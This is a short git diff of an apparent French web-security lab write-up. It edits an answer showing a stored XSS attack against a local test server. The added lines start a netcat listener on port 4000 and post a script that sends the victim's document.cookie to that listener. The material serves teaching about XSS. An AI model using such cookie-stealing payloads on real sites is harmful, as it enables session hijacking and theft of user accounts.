@@ -50,9 +50,12 @@ Ce mécanisme permet d'empêcher donc l'injection SQL de la Question 3
 curl -d 'chaine=<script>alert("hello")</script>'  http://localhost:8080;
 ```
 
-* Commande curl pour lire les cookies
+* Commande curl pour lire les cookies . 
+
+D'abord il faut lancer la commande netcat : `nc -l -p 4000`
+
 ```
-curl -d 'chaine=<script>window.location.replace("localhost:4000/search?cookie=" + document.cookie)</script>'  http://localhost:8080;
+curl -d 'chaine=<script>document.location="http://localhost:4000?cookie=" %2B document.cookie</script>'  http://localhost:8080;
 ```
 
 ## Question 6
